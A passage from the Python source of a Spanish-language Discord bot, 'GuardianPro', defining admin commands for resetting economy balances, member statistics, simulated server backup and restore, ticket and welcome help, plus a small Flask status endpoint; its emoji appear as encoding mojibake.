      title="üí∏ Dinero Removido",
      color=discord.Color.red()
  )
  embed.add_field(name="üë§ Usuario", value=member.mention, inline=True)
  embed.add_field(name="üí∏ Cantidad removida", value=f"${amount:,}", inline=True)
  embed.add_field(name="üìä Balance anterior", value=f"${current_balance['wallet']:,}", inline=True)
  embed.add_field(name="üìâ Nuevo balance", value=f"${new_balance['wallet']:,}", inline=True)
  embed.set_footer(text=f"Modificado por {ctx.author.display_name}")

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

  # Log del comando
  print(f"Comando *oce usado por {ctx.author.name}: -${amount:,} a {member.display_name}")

@bot.command(name='ecoreset')
async def admin_ecoreset(ctx, member: discord.Member = None):
  """*ecoreset - Resetear balance de usuario a 0 (solo administradores)"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if not member:
      embed = discord.Embed(
          title="‚ùå Uso Incorrecto",
          description="**Uso:** `*ecoreset @usuario`\n\n"
                      "**Ejemplo:**\n"
                      "‚Ä¢ `*ecoreset @Juan` - Resetea el balance de Juan a $0\n\n"
                      "**‚ö†Ô∏è Advertencia:** Esta acci√≥n resetear√° tanto la billetera como el banco a $0",
          color=discord.Color.red()
      )
      msg = await ctx.send(embed=embed)
      await asyncio.sleep(15)
      try:
          await msg.delete()
      except:
          pass
      return

  if member.bot:
      msg = await ctx.send("‚ùå No puedes modificar el balance de un bot.")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  # Obtener balance actual
  current_balance = get_balance(member.id)
  current_total = current_balance['wallet'] + current_balance['bank']

  # Resetear completamente el balance
  user_id = str(member.id)
  balances[user_id] = {"wallet": 0, "bank": 0}
  save_balances()

  # Crear embed de confirmaci√≥n
  embed = discord.Embed(
      title="üîÑ Balance Reseteado",
      color=discord.Color.orange()
  )
  embed.add_field(name="üë§ Usuario", value=member.mention, inline=True)
  embed.add_field(name="üìä Balance anterior", value=f"${current_total:,}", inline=True)
  embed.add_field(name="üîÑ Nuevo balance", value="$0", inline=True)
  embed.add_field(name="üí≥ Billetera anterior", value=f"${current_balance['wallet']:,}", inline=True)
  embed.add_field(name="üè¶ Banco anterior", value=f"${current_balance['bank']:,}", inline=True)
  embed.add_field(name="‚úÖ Estado", value="Completamente reseteado", inline=True)
  embed.set_footer(text=f"Reseteado por {ctx.author.display_name}")

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

  # Log del comando
  print(f"Comando *ecoreset usado por {ctx.author.name}: Balance de {member.display_name} reseteado (era ${current_total:,})")


# ================================
# COMANDOS DE INFORMACI√ìN Y ESTAD√çSTICAS (ADMIN)
# ================================

@bot.command(name='members')
async def admin_members(ctx):
  """*members - Lista de miembros del servidor"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  embed = discord.Embed(
      title=f"üë• Miembros de {guild.name}",
      color=discord.Color.blue())

  # Contar miembros por estado
  online = len([m for m in guild.members if m.status == discord.Status.online])
  idle = len([m for m in guild.members if m.status == discord.Status.idle])
  dnd = len([m for m in guild.members if m.status == discord.Status.dnd])
  offline = len([m for m in guild.members if m.status == discord.Status.offline])
  bots = len([m for m in guild.members if m.bot])

  embed.add_field(name="üü¢ En l√≠nea", value=online, inline=True)
  embed.add_field(name=" Dlg Ausente", value=idle, inline=True)
  embed.add_field(name=" üî¥ No Molestar", value=dnd, inline=True)
  embed.add_field(name=" ‚ö™ Desconectado", value=offline, inline=True)
  embed.add_field(name="ü§ñ Bots", value=bots, inline=True)
  embed.add_field(name="üë• Total", value=guild.member_count, inline=True)

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='backup')
async def admin_backup(ctx):
  """*backup - Crear respaldo del servidor (simulado)"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="üíæ Respaldo del Servidor",
      description="Iniciando proceso de respaldo...",
      color=discord.Color.blue()
  )
  await ctx.send(embed=embed)

  await asyncio.sleep(3) # Simular tiempo de respaldo

  backup_embed = discord.Embed(
      title="üíæ Respaldo Completado",
      description="Se ha creado un respaldo simulado del servidor.",
      color=discord.Color.green()
  )
  backup_embed.add_field(name="üìÅ Archivo", value="`server_backup.zip` (simulado)", inline=False)
  backup_embed.add_field(name="üïí Fecha", value=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), inline=False)

  msg = await ctx.send(embed=backup_embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='restore')
async def admin_restore(ctx):
  """*restore - Restaurar desde respaldo (simulado)"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="üîÑ Restauraci√≥n del Servidor",
      description="Iniciando proceso de restauraci√≥n desde respaldo...",
      color=discord.Color.orange()
  )
  await ctx.send(embed=embed)

  await asyncio.sleep(4) # Simular tiempo de restauraci√≥n

  restore_embed = discord.Embed(
      title="üîÑ Restauraci√≥n Completada",
      description="El servidor ha sido restaurado a su estado anterior (simulado).",
      color=discord.Color.blue()
  )
  restore_embed.add_field(name="üìÇ Archivo usado", value="`server_backup.zip` (simulado)", inline=False)
  restore_embed.set_footer(text="Se recomienda verificar la configuraci√≥n del servidor.")

  msg = await ctx.send(embed=restore_embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='tickets')
async def admin_tickets(ctx):
  """*tickets - Gestionar sistema de tickets"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="üé´ Gesti√≥n de Tickets",
      description="Comandos para administrar el sistema de tickets:",
      color=discord.Color.purple()
  )
  embed.add_field(
      name="‚öôÔ∏è Configuraci√≥n",
      value="`/ticket_setup` - Configurar panel de tickets\n"
            "`/tadd <nombre> <descripci√≥n> [color]` - A√±adir categor√≠a\n"
            "`/tedit <id> [nombre] [descripci√≥n] [color]` - Editar categor√≠a\n"
            "`/tremove <id>` - Eliminar categor√≠a",
      inline=False
  )
  embed.add_field(
      name="üìä Administraci√≥n",
      value="`*closeall` - Cerrar todos los tickets abiertos\n"
            "`*ticketlog <usuario>` - Ver historial de tickets de usuario",
      inline=False
  )

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='ticketlog')
async def admin_ticketlog(ctx, member: discord.Member = None):
  """*ticketlog - Ver historial de tickets de un usuario"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if not member:
      msg = await ctx.send("‚ùå Uso: `*ticketlog @usuario`")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  # Simulaci√≥n de historial de tickets
  history_embed = discord.Embed(
      title=f"üìú Historial de Tickets de {member.display_name}",
      color=discord.Color.blue())
  history_embed.add_field(name="ID Ticket", value="`ticket-general-12345`", inline=True)
  history_embed.add_field(name="Estado", value="‚úÖ Cerrado", inline=True)
  history_embed.add_field(name="Fecha Creaci√≥n", value="Hace 2 d√≠as", inline=True)
  history_embed.add_field(name="---", value="---", inline=False)
  history_embed.add_field(name="ID Ticket", value="`ticket-bugs-67890`", inline=True)
  history_embed.add_field(name="Estado", value="‚ùå Abierto", inline=True)
  history_embed.add_field(name="Fecha Creaci√≥n", value="Hace 1 hora", inline=True)
  history_embed.set_footer(text=f"Consultado por {ctx.author.display_name}")

  msg = await ctx.send(embed=history_embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass


# ================================
# COMANDOS DE BIENVENIDA (ADMIN)
# ================================

@bot.command(name='welcome')
async def admin_welcome(ctx):
  """*welcome - Configurar mensajes de bienvenida"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="üëã Configuraci√≥n de Bienvenida",
      description="Comandos para gestionar los mensajes de bienvenida:",
      color=discord.Color.teal()
  )
  embed.add_field(
      name="üîß Configurar",
      value="`/set_welcome_channel <canal>` - Establecer canal de bienvenida\n"
            "`/set_welcome_message <mensaje>` - Definir mensaje de bienvenida\n"
            "`/toggle_welcome <true/false>` - Activar/desactivar bienvenidas",
      inline=False
  )
  embed.add_field(
      name="üí° Variables del mensaje",
      value="`{user}` - Menciona al nuevo usuario\n"
            "`{username}` - Nombre de usuario\n"
            "`{server}` - Nombre del servidor",
      inline=False
  )

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass


# Configurar Flask
app = Flask(__name__)

@app.route('/')
def home():
  return jsonify({
      "status": "online",
      "bot": "GuardianPro",
      "version": "GPC 3",
      "servers": len(bot.guilds),
      "users": len(bot.users)
  })

@app.route('/status')
def status():
  return jsonify({
      "bot_ready": bot.is_ready(),
      "latency": round(bot.latency * 1000, 2),
      "guilds": len(bot.guilds),
      "users": len(bot.users),
      "economy_mode": economy_only_mode,
      "delta_commands": delta_commands_enabled
  })

def run_flask():
  app.run(host='0.0.0.0', port=8080, debug=False)

if __name__ == "__main__":
  token = os.getenv('DISCORD_TOKEN')
  if not token:
      print("‚ùå Error: DISCORD_TOKEN no encontrado en las variables de entorno")
      print("Agrega tu token de Discord en la secci√≥n Secrets")
      exit(1)

  # Iniciar Flask en un hilo separado
  flask_thread = threading.Thread(target=run_flask, daemon=True)
  flask_thread.start()
  print("üåê Servidor Flask iniciado en http://0.0.0.0:8080")

  try:
      bot.run(token)
  except Exception as e:
      print(f"‚ùå Error al iniciar el bot: {e}")
      exit(1)
